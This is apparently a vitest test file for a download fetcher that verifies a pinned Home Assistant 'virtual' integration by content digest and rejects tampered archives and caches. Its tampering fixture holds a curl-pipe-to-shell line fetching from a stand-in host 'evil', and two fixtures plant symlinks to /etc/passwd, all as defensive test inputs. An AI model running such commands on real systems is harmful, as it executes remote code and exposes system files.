import { createHash } from "node:crypto";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { create } from "tar";
import { afterEach, describe, expect, it } from "vitest";
import {
  VIRTUAL_COMMIT,
  VIRTUAL_CONTENT_SHA256,
  VIRTUAL_URL,
  contentDigest,
  ensureVirtualIntegration,
  type VirtualFile,
} from "../src/devices/fetch.js";

/**
 * The virtual-device integration is pinned by commit and checked by a digest of its files
 * (specs/007-debt-paydown FR-018, research R13). The digest is passed in through the test seam, so
 * the archives here are small stand-ins whose digest is known.
 */
const directories: string[] = [];
const scratch = (): string => {
  const directory = mkdtempSync(join(tmpdir(), "domusops-fetch-"));
  directories.push(directory);
  return directory;
};
afterEach(() => {
  for (const directory of directories.splice(0)) {
    rmSync(directory, { recursive: true, force: true });
  }
});

const GENUINE: Record<string, string> = {
  "manifest.json": '{"domain":"virtual"}',
  "translations/en.json": "{}",
  "light.py": "# the light platform\n",
};
const filesOf = (content: Record<string, string>): VirtualFile[] =>
  Object.entries(content).map(([path, text]) => ({
    path,
    data: Buffer.from(text),
  }));
const GENUINE_DIGEST = contentDigest(filesOf(GENUINE));

/** A tarball laid out like GitHub's archive of a commit, with the given files and extras. */
async function archive(
  content: Record<string, string>,
  extras: (base: string) => void = () => undefined,
): Promise<Buffer> {
  const root = scratch();
  const top = `hass-virtual-${VIRTUAL_COMMIT}`;
  const base = join(root, top, "custom_components", "virtual");
  for (const [path, text] of Object.entries(content)) {
    const target = join(base, ...path.split("/"));
    mkdirSync(join(target, ".."), { recursive: true });
    writeFileSync(target, text);
  }
  extras(base);
  const chunks: Buffer[] = [];
  for await (const chunk of create({ gzip: true, cwd: root }, [top])) {
    chunks.push(chunk as Buffer);
  }
  return Buffer.concat(chunks);
}

const cacheEntry = (cacheDir: string): string =>
  join(cacheDir, `hass-virtual-${VIRTUAL_COMMIT}`);

describe("the content digest", () => {
  it("is the SHA-256 of one 'path NUL file-sha256 newline' line per file, sorted by path", () => {
    const sha = (text: string): string =>
      createHash("sha256").update(text).digest("hex");
    const expected = createHash("sha256")
      .update(`a/b.json\0${sha("two")}\n`)
      .update(`z.py\0${sha("one")}\n`)
      .digest("hex");
    expect(
      contentDigest([
        { path: "z.py", data: Buffer.from("one") },
        { path: "a/b.json", data: Buffer.from("two") },
      ]),
    ).toBe(expected);
  });

  it("does not depend on the order the files are given in", () => {
    const files = filesOf(GENUINE);
    expect(contentDigest([...files].reverse())).toBe(contentDigest(files));
  });

  it("changes with a path or with a byte of a file", () => {
    const changedByte = { ...GENUINE, "light.py": "# the light platform!\n" };
    const renamed = { ...GENUINE, "lights.py": GENUINE["light.py"] ?? "" };
    delete (renamed as Record<string, string | undefined>)["light.py"];
    expect(contentDigest(filesOf(changedByte))).not.toBe(GENUINE_DIGEST);
    expect(contentDigest(filesOf(renamed))).not.toBe(GENUINE_DIGEST);
  });
});

describe("the pin", () => {
  it("names a commit, which the download URL uses", () => {
    expect(VIRTUAL_COMMIT).toMatch(/^[0-9a-f]{40}$/);
    expect(VIRTUAL_URL).toContain(VIRTUAL_COMMIT);
    expect(VIRTUAL_CONTENT_SHA256).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("downloading the integration", () => {
  it("installs what matches the digest and caches the extracted files", async () => {
    const cacheDir = scratch();
    const tarball = await archive(GENUINE);
    const files = await ensureVirtualIntegration({
      cacheDir,
      digest: GENUINE_DIGEST,
      download: async (url) => {
        expect(url).toBe(VIRTUAL_URL);
        return tarball;
      },
    });
    expect(files.map((file) => file.path)).toEqual([
      "light.py",
      "manifest.json",
      "translations/en.json",
    ]);
    expect(readFileSync(join(cacheEntry(cacheDir), "light.py"), "utf8")).toBe(
      GENUINE["light.py"],
    );
    // Served from the cache the second time, with no download.
    const again = await ensureVirtualIntegration({
      cacheDir,
      digest: GENUINE_DIGEST,
      download: async () => {
        throw new Error("offline");
      },
    });
    expect(again).toEqual(files);
  });

  it("refuses a file whose content was changed, and installs and caches nothing", async () => {
    const cacheDir = scratch();
    const tampered = await archive({
      ...GENUINE,
      "light.py": "import os; os.system('curl evil | sh')\n",
    });
    await expect(
      ensureVirtualIntegration({
        cacheDir,
        digest: GENUINE_DIGEST,
        download: async () => tampered,
      }),
    ).rejects.toMatchObject({
      code: "virtual_unavailable",
      message: expect.stringContaining(
        "the download failed its integrity check",
      ),
    });
    expect(readdirSync(cacheDir)).toEqual([]);
  });

  it("refuses an archive with a file added or one swapped for another", async () => {
    for (const content of [
      { ...GENUINE, "extra.py": "print('extra')\n" },
      { "manifest.json": GENUINE["manifest.json"] ?? "", "other.py": "x" },
    ]) {
      const cacheDir = scratch();
      await expect(
        ensureVirtualIntegration({
          cacheDir,
          digest: GENUINE_DIGEST,
          download: async () => archive(content),
        }),
      ).rejects.toMatchObject({ code: "virtual_unavailable" });
      expect(readdirSync(cacheDir)).toEqual([]);
    }
  });

  it("rejects an archive with a link inside the integration", async () => {
    const cacheDir = scratch();
    const linked = await archive(GENUINE, (base) =>
      symlinkSync("/etc/passwd", join(base, "link.py")),
    );
    await expect(
      ensureVirtualIntegration({
        cacheDir,
        digest: GENUINE_DIGEST,
        download: async () => linked,
      }),
    ).rejects.toMatchObject({
      code: "virtual_unavailable",
      message: expect.stringContaining("link"),
    });
    expect(readdirSync(cacheDir)).toEqual([]);
  });
});

describe("the cache", () => {
  async function seeded(
    cacheDir: string,
    spoil: (entry: string) => void,
  ): Promise<void> {
    await ensureVirtualIntegration({
      cacheDir,
      digest: GENUINE_DIGEST,
      download: async () => archive(GENUINE),
    });
    spoil(cacheEntry(cacheDir));
  }

  it("is deleted when a file in it no longer matches, and downloaded again once", async () => {
    const cacheDir = scratch();
    await seeded(cacheDir, (entry) =>
      writeFileSync(join(entry, "light.py"), "tampered"),
    );
    let downloads = 0;
    const files = await ensureVirtualIntegration({
      cacheDir,
      digest: GENUINE_DIGEST,
      download: async () => {
        downloads += 1;
        return archive(GENUINE);
      },
    });
    expect(downloads).toBe(1);
    expect(contentDigest(files)).toBe(GENUINE_DIGEST);
    expect(readFileSync(join(cacheEntry(cacheDir), "light.py"), "utf8")).toBe(
      GENUINE["light.py"],
    );
  });

  it("is deleted when a file was added to it, or one removed", async () => {
    for (const spoil of [
      (entry: string) => writeFileSync(join(entry, "added.py"), "x"),
      (entry: string) => rmSync(join(entry, "light.py")),
    ]) {
      const cacheDir = scratch();
      await seeded(cacheDir, spoil);
      let downloads = 0;
      await ensureVirtualIntegration({
        cacheDir,
        digest: GENUINE_DIGEST,
        download: async () => {
          downloads += 1;
          return archive(GENUINE);
        },
      });
      expect(downloads).toBe(1);
    }
  });

  it("is not trusted when it holds a link", async () => {
    const cacheDir = scratch();
    await seeded(cacheDir, (entry) =>
      symlinkSync("/etc/passwd", join(entry, "link.py")),
    );
    let downloads = 0;
    await ensureVirtualIntegration({
      cacheDir,
      digest: GENUINE_DIGEST,
      download: async () => {
        downloads += 1;
        return archive(GENUINE);
      },
    });
    expect(downloads).toBe(1);
    expect(existsSync(join(cacheEntry(cacheDir), "link.py"))).toBe(false);
  });

  it("is not downloaded again when it matches, even with no network", async () => {
    const cacheDir = scratch();
    await seeded(cacheDir, () => undefined);
    const files = await ensureVirtualIntegration({
      cacheDir,
      digest: GENUINE_DIGEST,
      download: async () => {
        throw new Error("offline");
      },
    });
    expect(files).toHaveLength(3);
  });
});
